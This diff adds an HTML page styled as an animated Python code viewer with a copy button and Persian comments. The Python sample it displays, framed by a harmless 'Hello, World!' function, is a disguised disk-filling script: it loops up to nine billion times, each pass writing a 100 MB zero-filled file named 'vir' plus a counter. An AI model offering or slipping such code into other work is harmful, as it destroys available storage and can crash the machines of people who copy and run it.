@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Animated Python Code Viewer</title>
+    <style>
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            font-size: 14px;
+            font-family: 'Courier New', Courier, monospace;
+            line-height: 1.5;
+            overflow-x: auto;
+        }
+        .typewriter {
+            overflow: hidden; /*جلوگیری از نمایش تمام محتوا*/
+            white-space: pre-wrap; /*عدم شکستن خطوط و نمایش فضای سفید*/
+            border-right: .15em solid orange; /*افزودن خط عمودی به سمت راست به عنوان نشانگر تایپ*/
+            animation: typing 3s steps(40, end), blink-caret .75s step-end infinite;
+        }
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+        @keyframes blink-caret {
+            from, to { border-color: transparent }
+            50% { border-color: orange; }
+        }
+        .code-copy-button {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            font-size: 12px;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        pre:hover .code-copy-button {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <pre class="code-container">
+        <code class="typewriter">
+count = 1
+while count < 9000000000:
+    file_name = "vir" + str(count)
+    file_size = 1024 * 1024 * 100
+    with open(file_name, 'wb') as file:
+        file.write(b'\0' * file_size)
+        print(count)
+    count += 1
+def hello():
+    print("Hello, World!")
+
+hello()
+        </code>
+        <button class="code-copy-button" onclick="copyCode()">کپی کد</button>
+    </pre>
+
+    <script>
+        function copyCode() {
+            var codeElement = document.querySelector('.code-container code');
+            var range = document.createRange();
+            range.selectNode(codeElement);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            window.getSelection().removeAllRanges();
+        }
+    </script>
+</body>
+</html>
